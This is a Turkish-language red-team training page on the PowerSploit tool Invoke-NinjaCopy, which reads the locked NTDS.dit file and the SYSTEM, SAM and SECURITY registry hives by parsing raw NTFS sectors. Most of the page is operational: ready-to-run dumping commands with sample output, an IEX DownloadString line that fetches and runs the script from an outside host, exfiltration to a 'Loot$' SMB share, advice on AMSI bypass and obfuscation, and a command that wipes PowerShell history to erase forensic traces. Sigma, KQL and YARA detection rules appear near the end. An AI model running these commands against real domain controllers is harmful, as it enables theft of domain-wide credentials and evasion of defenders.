# Invoke-NinjaCopy

> **Kategori:** [12. NTDS.dit, GPO Şifreleri ve LAPS Hasadı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows dosya sistemi kilitleme mekanizmalarını ve Volume Shadow Copy (VSS) gereksinimini devre dışı bırakarak, doğrudan ham NTFS disk sektörleri (Raw Disk Access) üzerinden `NTDS.dit` ve `SYSTEM` kovanlarını okuyan PowerShell aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory etki alanı denetleyicilerinde (DC) `NTDS.dit` veritabanı dosyası, sistem ayağa kalktığı andan itibaren `lsass.exe` ve ESE Jet veritabanı motoru tarafından kilitli tutulur. Standart Windows Win32 dosya API'leri (`CreateFileW`) bir dosyayı açarken `FILE_SHARE_READ` veya `FILE_SHARE_WRITE` bayraklarını denetler. Eğer bir süreç dosyayı bu bayrakları paylaşmadan (özel erişimle) açmışsa, işletim sistemi diğer tüm okuma ve kopyalama taleplerini "The process cannot access the file because it is being used by another process" (Hata Kodu 32) uyarısıyla engeller.

Geleneksel çözümler (VSSAdmin, DiskShadow, ntdsutil) bu kilidi aşmak için Volume Shadow Copy Service (VSS) mekanizmasını tetikler. Ancak VSS servisinin başlatılması, snapshot oluşturulması ve silinmesi geride çok sayıda Windows Güvenlik ve Sistem günlüğü (Event ID 7036, 4932, 4933) bırakır ve modern EDR sistemlerinin dikkatini çeker.

**Invoke-NinjaCopy** (Joe Bialek / @JosephBialek tarafından PowerSploit projesi kapsamında geliştirilmiştir), VSS servisine veya herhangi bir Windows yedekleme API'sine **hiç başvurmadan** kilitli dosyaları okuma yeteneğine sahiptir. Araç, doğrudan mantıksal disk birimini (`\\.\C:`) ham aygıt (Raw Volume) olarak açar, NTFS dosya sisteminin Master File Table ($MFT) yapısını bellekte ayrıştırır (parse), hedeflenen dosyanın disk üzerindeki sektör/küme (cluster data runs) konumlarını bulur ve doğrudan disk sektörlerini bayt bayt okuyarak hedef konuma yazar. Bu yaklaşım, dosya sistemi kilitlerini ve erişim denetim listelerini (DACL) tamamen baypas eder.

### Mimari Akış Şeması

```
+-----------------------------------------------------------------------------------+
|                           INVOKE-NINJACOPY MIMARI AKIŞI                           |
+-----------------------------------------------------------------------------------+
  [PowerShell Süreci]                                [Ham Disk / NTFS Depolama]
 (Invoke-NinjaCopy.ps1)                              (\\.\C: - Raw Storage)
           |                                                    |
           |--- 1. CreateFile("\\.\C:", GENERIC_READ) --------->|
           |       (Win32 Ham Birim Tanımlayıcısı Alınır)       |--- 2. Dosya Sistemi
           |                                                    |       Kilitleri Baypas Edilir
           |<-- 2. Birim Handle Değeri Döner -------------------|
           |                                                    |
           |--- 3. $MFT (Master File Table) Okunur ------------>|--- 3. $MFT Kayıtları
           |       (NTFS Metadata ve Dosya Konumları Taranır)   |       Belleğe Çekilir
           |                                                    |
           |--- 4. ntds.dit Cluster Data Run Haritası Çıkarılır |
           |       [LCN: Mantıksal Küme Numaraları Belirlenir]  |
           |                                                    |
           |--- 5. Ham Sektörler Sırayla Okunur --------------->|--- 4. lsass.exe Kilidi
           |       (ReadRawDiskSectors API Döngüsü)             |       Etkisiz Kılınır
           |<-- 6. Ham Bayt Verisi Belleğe Akar ----------------|
           |                                                    |
           |--- 7. Hedef Dosyaya Sıralı Yazım Yapılır ---------> [C:\Temp\ntds.dit]
           |       (ntds.dit ve SYSTEM kovanı dışa aktarılır)   | (Eksiksiz Kopya)
```

### Neden Önemli?

| Yetenek | Operasyonel Avantaj | Alternatif Araçlara Üstünlüğü |
| :--- | :--- | :--- |
| **Sıfır VSS Bağımlılığı** | Volume Shadow Copy servisini asla tetiklemez. | VSS oluşturma/silme günlüklerini (Event 4932/4933) üretmez. |
| **Ham Disk Erişimi** | Win32 dosya kilidi kontrollerini tamamen atlatır. | `lsass.exe` sürecini askıya almaya veya durdurmaya gerek bırakmaz. |
| **MFT Ayrıştırma Yeteneği**| Dosya sistemini sektör seviyesinde bellekte çözer. | Dosya izinlerini (NTFS DACL) ve kısıtlamalarını dikkate almaz. |
| **Bellekte Yürütme** | Dot-sourcing (`. .\Invoke-NinjaCopy.ps1`) ile çalışır.| Hedef diske derlenmiş harici `.exe` dosyası bırakmaz. |
| **Çok Yönlü Dosya Hasadı** | Yalnızca NTDS değil; SAM, SYSTEM ve kilitli logları çeker.| Tüm kilitli işletim sistemi veritabanlarına uygulanabilir. |

### Karşılaştırma Tablosu

| Özellik | Invoke-NinjaCopy | ntdsutil (IFM) | vssadmin | impacket-secretsdump |
| :--- | :--- | :--- | :--- | :--- |
| **Kullanılan Mekanizma** | Ham NTFS Birim Okuma (`\\.\C:`) | VSS Shadow Copy API | VSS CLI (`create shadow`) | DRSUAPI RPC Replikasyonu |
| **VSS Servisi Gereksinimi** | Hayır (Tamamen bağımsız) | Evet (Arka planda VSS çalışır) | Evet (Doğrudan VSS kullanır) | Hayır (Ağ replikasyonu) |
| **Hedefte Çalışma Konumu** | DC Yerel PowerShell | DC Yerel Komut Satırı | DC Yerel Komut Satırı | Uzaktan Ağ Üzerinden |
| **İmza ve Dil** | PowerShell Betiği (.ps1) | Microsoft İmzalı LOLBin (.exe)| Microsoft İmzalı LOLBin (.exe)| Python İstemcisi |
| **EDR Tespit Noktası** | Raw Disk Access & AMSI/ScriptBlock| Komut Satırı Argümanları | Komut Satırı Argümanları | Ağ Replikasyon Trafiği |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

`Invoke-NinjaCopy` PowerShell cmdlet formatında kaynak dosya yolu, kaynak disk birimi ve hedef dizin parametreleriyle çağrılır:

```powershell
Invoke-NinjaCopy -Path <Kaynak_Dosya> -Volume <Kaynak_Birim> -LocalDestination <Hedef_Dosya>
```

### Desteklenen Kritik Bayraklar

| Parametre | Tür | Açıklama | Örnek Değer |
| :--- | :--- | :--- | :--- |
| `-Path` | String | Okunmak istenen kilitli dosyanın tam yolu (Zorunlu). | `C:\Windows\NTDS\ntds.dit` |
| `-Volume` | String | Kaynak dosyanın bulunduğu disk birim harfi veya guid yolu. | `C:` veya `\\?\Volume{...}` |
| `-LocalDestination` | String | Çıkarılan dosyanın diske yazılacağı yerel hedef yolu. | `C:\Windows\Temp\ntds.dit` |
| `-RemoteDestination`| String | Çıkarılan dosyanın uzak bir SMB paylaşımına yazılacağı yol. | `\\192.168.1.10\share\ntds.dit` |
| `-ComputerName` | String | Komutun uzaktan WSMAN/RPC ile çalıştırılacağı hedef sunucu. | `DC01.corp.local` |
| `-Verbose` | Switch | MFT tarama ve sektör okuma adımlarını detaylı görüntüler. | Bayrak |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Kilitli NTDS.dit Dosyasını Yerel Dizine Kopyalama
Domain Controller üzerinde kilit altındaki etki alanı veritabanını ham disk üzerinden `C:\Temp` dizinine çıkarma:

```powershell
Invoke-NinjaCopy -Path "C:\Windows\NTDS\ntds.dit" -Volume "C:" -LocalDestination "C:\Windows\Temp\ntds.dit" -Verbose
```

**Konsol Çıktı Analizi:**
```
VERBOSE: Volume \\.\C: opened successfully.
VERBOSE: Finding MFT record for C:\Windows\NTDS\ntds.dit...
VERBOSE: MFT Record found at record index: 48921.
VERBOSE: Reading non-resident data runs for file stream...
VERBOSE: Reading 157286400 bytes from raw disk sectors...
VERBOSE: 100% of data runs copied successfully.
VERBOSE: File written to C:\Windows\Temp\ntds.dit.
[+] File successfully copied using Raw NTFS Disk Access!
```

### Senaryo 2: SYSTEM ve SAM Kayıt Defteri Kovanlarını Çıkarma
Parola özetlerini çözmek için gereken `SYSTEM` kovanını ve yerel hesaplar için `SAM` dosyasını kilitli durumdayken çekme:

```powershell
Invoke-NinjaCopy -Path "C:\Windows\System32\config\SYSTEM" -Volume "C:" -LocalDestination "C:\Windows\Temp\SYSTEM"
Invoke-NinjaCopy -Path "C:\Windows\System32\config\SAM" -Volume "C:" -LocalDestination "C:\Windows\Temp\SAM"
```

**Konsol Çıktı Analizi:**
```
[+] SYSTEM hive extracted: 18874368 bytes written.
[+] SAM hive extracted: 65536 bytes written.
```

### Senaryo 3: Modülü Bellek İçi (In-Memory Dot-Sourcing) Yükleme
Diske herhangi bir `.ps1` dosyası yazmadan denetim makinesindeki modülü hedef PowerShell oturumunun belleğine alma:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/Invoke-NinjaCopy.ps1')
Invoke-NinjaCopy -Path "C:\Windows\NTDS\ntds.dit" -Volume "C:" -LocalDestination "C:\PerfLogs\ntds.dit"
```

**Konsol Çıktı Analizi:**
```
# Bellek içi yükleme diske dosya bırakmaz
VERBOSE: Volume handle acquired.
[+] File successfully copied!
```

### Senaryo 4: Kilitli Olay Günlüğü Dosyalarını (Security.evtx) Adli Analiz İçin Alma
İşletim sistemi tarafından kilitli tutulan Windows Güvenlik günlüğünü canlı sistemden ham sektör okumasıyla çekme:

```powershell
Invoke-NinjaCopy -Path "C:\Windows\System32\Winevt\Logs\Security.evtx" -Volume "C:" -LocalDestination "C:\Temp\Security_Dump.evtx"
```

**Konsol Çıktı Analizi:**
```
VERBOSE: Reading raw sectors for Security.evtx...
[+] Copied 20971520 bytes without stopping Windows Event Log Service.
```

### Senaryo 5: İkincil Disk Bölümünden (D:) Kilitli Veritabanı Dosyası Çekme
Active Directory veritabanı `C:` yerine `D:` sürücüsüne kurulmuş olan kurumsal DC'lerde farklı volume belirterek hasat yapma:

```powershell
Invoke-NinjaCopy -Path "D:\AD_Database\ntds.dit" -Volume "D:" -LocalDestination "C:\Temp\ntds_d.dit"
```

**Konsol Çıktı Analizi:**
```
VERBOSE: Volume \\.\D: opened successfully.
VERBOSE: Finding MFT record on volume D:...
[+] File successfully copied!
```

### Senaryo 6: Elde Edilen Dosyaların Bütünlük Doğrulaması
Alınan kopyanın bozulup bozulmadığını ve orijinal dosya boyutuyla eşleştiğini doğrulamak için SHA-256 özeti üretme:

```powershell
Get-FileHash -Path "C:\Windows\Temp\ntds.dit" -Algorithm SHA256
```

**Konsol Çıktı Analizi:**
```
Algorithm       Hash                                                               Path
---------       ----                                                               ----
SHA256          A4F2C91B4E8203EAA5B1298402D...                                     C:\Windows\Temp\ntds.dit
```

### Senaryo 7: Uzak SMB Paylaşımına Doğrudan Hasat (Remote Destination)
DC üzerinde yerel disk izi bırakmamak amacıyla ham diskten okunan veritabanı akışını doğrudan uzaktaki yetkili bir SMB paylaşımına aktarma:

```powershell
Invoke-NinjaCopy -Path "C:\Windows\NTDS\ntds.dit" -Volume "C:" -RemoteDestination "\\192.168.1.10\Loot$\ntds.dit"
```

**Konsol Çıktı Analizi:**
```
VERBOSE: Volume \\.\C: opened successfully.
VERBOSE: MFT Record for NTDS.dit resolved.
VERBOSE: Streaming raw cluster sectors directly to network destination \\192.168.1.10\Loot$\ntds.dit...
VERBOSE: Transfer complete. Zero local artifacts written to DC storage.
[+] Remote file exfiltration successful!
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Mesajı | Kök Neden | Kesin Çözüm Adımı |
| :--- | :--- | :--- |
| `Failed to open volume \\.\C: (Access is denied - 0x5)` | PowerShell yönetici haklarıyla (Run as Administrator) başlatılmamış; ham birim erişimi SeDebugPrivilege gerektirir. | PowerShell konsolunu sağ tıklayıp "Yönetici olarak çalıştır" seçeneğiyle açın veya SYSTEM yetkisine geçin. |
| `Could not locate MFT record for file` | Belirtilen dosya yolu NTFS üzerinde bulunamadı veya disk aşırı parçalanmış (fragmented) MFT yapısına sahip. | Dosya yolunu büyük/küçük harf duyarlılığına dikkat ederek tam mutlak yol (`C:\Windows\NTDS\ntds.dit`) olarak verin. |
| `Cannot parse compressed or sparse NTFS data streams` | Hedef dosya NTFS yerleşik sıkıştırma (NTFS compression) veya sparse file bayrağı ile işaretlenmiş. | Invoke-NinjaCopy yalnızca ham/sıkıştırılmamış verileri destekler; bu senaryoda `ntdsutil IFM` veya `vssadmin` yöntemine dönün. |
| `Out of Memory Exception during large file copy` | PowerShell süreci 32-bit (x86) mimaride çalıştırıldığından 2 GB bellek sınırına takılıyor. | PowerShell'i mutlaka 64-bit (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) altından başlatın. |
| `Script execution blocked by Antivirus / AMSI` | Windows Defender veya EDR sensörü `Invoke-NinjaCopy` fonksiyon adını veya Win32 P/Invoke tanımlarını engelliyor. | AMSI bellek içi baypas yöntemlerini uygulayın veya değişken ve fonksiyon adlarını gizleyin (obfuscation). |
| `Target file already exists and cannot be overwritten` | `-LocalDestination` parametresinde belirtilen dosya hedefte mevcut ve kilitli. | Hedef dosya adını benzersiz bir isimle (`ntds_bak.dit`) değiştirin veya mevcut dosyayı silin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
[OPSEC GÜRÜLTÜ SKALASI: ORTA - YÜKSEK]
0 --------------[6.5 - RAW DISK ACCESS & POWERSHELL]-------------- 10
  - VSS Seviyesi: Sıfır VSS izi (Event 4932/4933 üretilmez - Yüksek OPSEC Kazancı)
  - Uç Nokta Seviyesi: Ham disk birimi erişimi (\\.\C:) ve PowerShell Script Block logları (Yüksek Tespit)
```

### 5.1 Bırakılan İzler (Event Logs)

* **Microsoft-Windows-PowerShell/Operational (Event ID 4104 - Script Block Logging):**
  * Betiğin içerisindeki `CreateFile`, `\\.\C:`, `ReadRawDiskSectors` ve `Invoke-NinjaCopy` fonksiyon tanımları tam metin olarak günlüğe kaydedilir.
* **Microsoft-Windows-PowerShell/Operational (Event ID 4103 - Pipeline Execution):**
  * `Invoke-NinjaCopy` çağrısı ve parametreleri (`-Path`, `-LocalDestination`) kaydedilir.
* **Sysmon Event ID 1 (Process Creation):**
  * PowerShell sürecinin komut satırı argümanları (`powershell.exe -Enc ...` veya `-File Invoke-NinjaCopy.ps1`) günlüğe düşer.
* **Sysmon Event ID 11 (FileCreate):**
  * Hedef dizinde (`C:\Windows\Temp\ntds.dit`) yeni oluşturulan dosya kaydı incelenir.

### 5.2 Ağ ve EDR İmzaları

* **Direct Volume Access (Ham Disk Erişimi) İmzası:**
  Normal kullanıcı uygulamaları `\\.\C:` aygıt yolunu `GENERIC_READ` ile açmaz. Modern EDR sensörleri (CrowdStrike, Defender for Endpoint, SentinelOne), standart süreçlerin ham disk handle'ı talep etmesini doğrudan "Credential Theft via Raw Disk Access" kuralıyla engeller.
* **AMSI (Antimalware Scan Interface):**
  PowerSploit kökenli kod blokları, AMSI imzalarına (AmsiScanBuffer) takılır ve yürütülmeden önce engellenir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Operasyonel Kullanım |
| :--- | :--- | :--- | :--- |
| **Credential Access** | `T1003.003` | OS Credential Dumping: NTDS | Ham disk sektörlerinden kilitli `ntds.dit` veritabanını çıkarma. |
| **Defense Evasion** | `T1006` | Direct Volume Access | Dosya sistemi API'lerini ve kilit kontrollerini baypas etmek için ham aygıt okuma. |
| **Execution** | `T1059.001` | PowerShell | Yürütme ortamı olarak PowerShell motorunu kullanma. |

### 5.4 OPSEC Önerileri

| Tespit Riski | Önlem / İyileştirme |
| :--- | :--- |
| **PowerShell Script Block (4104)** | Betiği standart PowerShell oturumunda çalıştırmak yerine, C# ile derlenmiş unmanaged bir ikili veya C2 runner içine gömmek logları azaltır. |
| **AMSI İmzaları** | Kod içerisindeki değişken adları (`$MFT`, `$Volume`, `Invoke-NinjaCopy`) karıştırılmalı (obfuscate edilmeli) veya bellek içi AMSI yaması uygulanmalıdır. |
| **`\\.\C:` Aygıt Açma Tespiti** | Ham disk erişimi EDR tarafından sıkı denetleniyorsa, resmi LOLBin olan `ntdsutil IFM` yöntemi tercih edilmelidir. |
| **Disk İzi Temizliği** | Alınan dosyalar ağ üzerinden aktarıldıktan hemen sonra hedef dizinden silinmelidir. |

### 5.5 Savunma Karşılığı

#### Sigma Kuralı: PowerShell ile Ham Disk Erişimi (Direct Volume Access) Tespiti
```yaml
title: PowerShell Tarafindan Ham Disk Birimi Erisimi (Direct Volume Access)
id: d921a84f-3c12-4e89-b821-441298a76123
status: experimental
description: Invoke-NinjaCopy veya benzeri scriptlerin kilitli dosyalari calmak amaciyla \\.\C: raw volume handle acmasini tespit eder.
references:
    - https://attack.mitre.org/techniques/T1006/
author: Active Directory Guvenlik Ekibi
date: 2026/10/14
logsource:
    category: ps_script
    product: windows
    definition: 'ScriptBlockLogging (Event ID 4104)'
detection:
    selection:
        ScriptBlockText|contains|all:
            - '\\\\.\\'
        ScriptBlockText|contains:
            - 'CreateFile'
            - 'GENERIC_READ'
            - 'FILE_SHARE_READ'
            - 'Invoke-NinjaCopy'
            - 'ntds.dit'
    condition: selection
falsepositives:
    - Ozel adli bilisim (DFIR) veya imaj alma scriptleri.
level: critical
tags:
    - attack.credential_access
    - attack.t1003.003
    - attack.t1006
```

#### Microsoft Sentinel KQL Sorgusu
```kql
// PowerShell ScriptBlock loglarinda ham disk ve ntds.dit referanslarini arar
Event
| where Source == "Microsoft-Windows-PowerShell" and EventID == 4104
| where RenderedDescription has_all ("\\\\.\\", "ntds.dit") or RenderedDescription has "Invoke-NinjaCopy"
| project TimeGenerated, Computer, EventID, RenderedDescription
| order by TimeGenerated desc
```

#### YARA Kuralı: Invoke-NinjaCopy Betik İmzası
```yara
rule Threat_Script_Invoke_NinjaCopy {
    meta:
        description = "Invoke-NinjaCopy PowerShell kilitli dosya kopyalama aracini tespit eder"
        author = "AD Guvenlik Laboratuvari"
        date = "2026-10-14"
        severity = "High"
    strings:
        $s1 = "Invoke-NinjaCopy" ascii wide nocase
        $s2 = "\\\\.\\" ascii wide
        $s3 = "ReadRawDiskSectors" ascii wide nocase
        $s4 = "Get-MFTRecord" ascii wide nocase
        $s5 = "LocalDestination" ascii wide
    condition:
        3 of ($s*)
}
```

#### Sertleştirme (Hardening) Adımları
1. **PowerShell Constrained Language Mode:** Etki alanı genelinde AppLocker veya WDAC ile PowerShell `ConstrainedLanguage` moduna alınarak Win32 API çağrıları (P/Invoke) engellenmelidir.
2. **Uç Nokta EDR Raw Disk Blokajı:** EDR yazılımlarında "Block Direct Volume Access for non-whitelisted processes" kuralı aktif hale getirilmelidir.
3. **Domain Controller Sıkılaştırması:** DC'ler üzerinde PowerShell Script Block Logging (Event ID 4104) zorunlu tutulmalı ve tüm script çalıştırma aktiviteleri SIEM'e anlık iletilmelidir.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

#### 1. Kilitli NTDS.dit Dosyasını Yerel Olarak Kopyalama
```powershell
Invoke-NinjaCopy -Path "C:\Windows\NTDS\ntds.dit" -Volume "C:" -LocalDestination "C:\Windows\Temp\ntds.dit"
```
* **Ne Yapar?:** VSS kullanmadan doğrudan ham diskten `ntds.dit` veritabanını çeker.
* **Ne Zaman Kullanılır?:** DC üzerinde kilitli veritabanını sessizce almak için.
* **Parametreler:** `-Path` kaynak, `-Volume` disk harfi, `-LocalDestination` hedef dosya.

#### 2. SYSTEM Kayıt Defteri Kovanını Çekme
```powershell
Invoke-NinjaCopy -Path "C:\Windows\System32\config\SYSTEM" -Volume "C:" -LocalDestination "C:\Windows\Temp\SYSTEM"
```
* **Ne Yapar?:** BootKey anahtarını barındıran kilitli `SYSTEM` kovanını diske kopyalar.
* **Ne Zaman Kullanılır?:** `ntds.dit` hasadı sonrasında şifre çözme anahtarını elde etmek için.
* **Parametreler:** `-Path` kovan yolu.

#### 3. SAM Kovanını Ham Diskten Alma
```powershell
Invoke-NinjaCopy -Path "C:\Windows\System32\config\SAM" -Volume "C:" -LocalDestination "C:\Windows\Temp\SAM"
```
* **Ne Yapar?:** Yerel hesap parola özetlerini içeren SAM veritabanını ham sektörden okur.
* **Ne Zaman Kullanılır?:** Yerel yönetici hesaplarının parolalarını kırmak için.
* **Parametreler:** `-Path` SAM yolu.

#### 4. SECURITY Kovanını Ham Diskten Kopyalama
```powershell
Invoke-NinjaCopy -Path "C:\Windows\System32\config\SECURITY" -Volume "C:" -LocalDestination "C:\Windows\Temp\SECURITY"
```
* **Ne Yapar?:** LSA sırları (LSA Secrets) ve önbellek kimlik bilgilerini içeren kovanı çeker.
* **Ne Zaman Kullanılır?:** Servis hesabı parolalarını ve makine parolalarını çözmek için.
* **Parametreler:** `-Path` SECURITY kovanı.

#### 5. Uzak DC Üzerinden Dosya Çekme
```powershell
Invoke-NinjaCopy -ComputerName "DC01.corp.local" -Path "C:\Windows\NTDS\ntds.dit" -Volume "C:" -LocalDestination "C:\Temp\ntds.dit"
```
* **Ne Yapar?:** WinRM/RPC protokolüyle uzak sunucuda NinjaCopy fonksiyonunu çalıştırıp veriyi yerel sisteme aktarır.
* **Ne Zaman Kullanılır?:** Doğrudan DC konsoluna oturum açmadan uzaktan veri hasadı yaparken.
* **Parametreler:** `-ComputerName` uzak sunucu adı.

#### 6. Bellek İçi Modül Yükleme (Dot-Sourcing)
```powershell
. .\Invoke-NinjaCopy.ps1
```
* **Ne Yapar?:** İndirilen betik dosyasını mevcut PowerShell oturumunun fonksiyon tablosuna ekler.
* **Ne Zaman Kullanılır?:** Cmdlet'leri komut satırından çağrılabilir hale getirmek için.
* **Parametreler:** PowerShell dot-source sözdizimi.

#### 7. Kilitli Olay Günlüğü Dosyalarını Alma
```powershell
Invoke-NinjaCopy -Path "C:\Windows\System32\Winevt\Logs\Security.evtx" -Volume "C:" -LocalDestination "C:\Temp\sec.evtx"
```
* **Ne Yapar?:** Canlı sistemde yazılmaya devam eden güvenlik günlüğünü ham diskten çeker.
* **Ne Zaman Kullanılır?:** Olay müdahale veya adli analiz aşamalarında günlüğü incelemek için.
* **Parametreler:** `-Path` evtx dosya yolu.

#### 8. Farklı Mantıksal Sürücüden (D:) Dosya Çekme
```powershell
Invoke-NinjaCopy -Path "D:\Database\ntds.dit" -Volume "D:" -LocalDestination "C:\Temp\ntds_d.dit"
```
* **Ne Yapar?:** Sistem diski haricindeki ikincil disk bölümündeki kilitli dosyayı okur.
* **Ne Zaman Kullanılır?:** NTDS veritabanı farklı bir sürücüye kurulmuşsa.
* **Parametreler:** `-Volume "D:"`.

#### 9. Çıktı Dosyası SHA-256 Doğrulaması
```powershell
Get-FileHash -Path "C:\Windows\Temp\ntds.dit" -Algorithm SHA256
```
* **Ne Yapar?:** Kopyalanan dosyanın tam boyutunu ve kriptografik özetini üretir.
* **Ne Zaman Kullanılır?:** Dosya transferi öncesi verinin bozulmadığını kontrol etmek için.
* **Parametreler:** `Get-FileHash`.

#### 10. İşlem Sonrası PowerShell Geçmişini Temizleme
```powershell
Clear-History; Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
```
* **Ne Yapar?:** Çalıştırılan hassas komutların PowerShell geçmiş dosyasından (`ConsoleHost_history.txt`) silinmesini sağlar.
* **Ne Zaman Kullanılır?:** Operasyon tamamlandığında adli analiz izlerini temizlemek için.
* **Parametreler:** `Clear-History` ve `Remove-Item`.

---

## Kaynaklar
* [PowerSploit Resmi GitHub Deposu (Invoke-NinjaCopy)](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)
* [Microsoft Dokümantasyonu: Direct Access to the Volume](https://learn.microsoft.com/en-us/windows/win32/fileio/direct-access-to-the-volume)
* [Microsoft Dokümantasyonu: Master File Table (NTFS Reference)](https://learn.microsoft.com/en-us/windows/win32/fileio/master-file-table)
* [MITRE ATT&CK: OS Credential Dumping: NTDS (T1003.003)](https://attack.mitre.org/techniques/T1003/003/)
* [MITRE ATT&CK: Direct Volume Access (T1006)](https://attack.mitre.org/techniques/T1006/)
* [HackTricks: Bypassing Locked Files via Raw NTFS](https://book.hacktricks.xyz/windows-hardening/stealing-credentials#invokeninjacopy)
* [SpecterOps: Exploring Volume Access and Credential Extraction](https://posts.specterops.io/)

---

> **Önceki:** [← vssadmin / diskshadow](./vssadmin_diskshadow.md) · **Sonraki:** [gpp-decrypt →](./gpp-decrypt.md)

